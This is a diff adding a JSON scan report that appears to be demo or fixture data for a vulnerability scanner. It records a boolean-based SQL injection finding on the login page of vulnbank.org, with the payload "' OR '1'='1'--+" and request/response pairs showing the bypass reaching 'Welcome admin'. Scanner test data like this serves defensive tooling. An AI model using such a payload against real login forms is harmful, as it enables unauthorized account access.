@@ -1,0 +1,41 @@
+{
+    "scan_id": "scan-demo-001",
+    "tool": { "name": "demo-scanner", "version": "0.1" },
+    "target": "http://vulnbank.org/login",
+    "started_at": "2025-09-27T00:00:00Z",
+    "vulnerabilities": [
+      {
+        "id": "v1",
+        "url": "http://vulnbank.org/login",
+        "param": "username",
+        "method": "GET",
+        "payload": "' OR '1'='1'--+",
+        "technique": "boolean",
+        "dbms": "MySQL",
+        "confidence": "high",
+        "proof": {
+          "baseline_request": {
+            "method": "GET",
+            "path": "/login?username=admin",
+            "headers": {},
+            "body": ""
+          },
+          "injected_request": {
+            "method": "GET",
+            "path": "/login?username=%27%20OR%20%271%27%3D%271",
+            "headers": {},
+            "body": ""
+          },
+          "baseline_response": {
+            "status": 200,
+            "body_snippet": "Please login"
+          },
+          "injected_response": {
+            "status": 200,
+            "body_snippet": "Welcome admin"
+          }
+        }
+      }
+    ]
+  }
+  
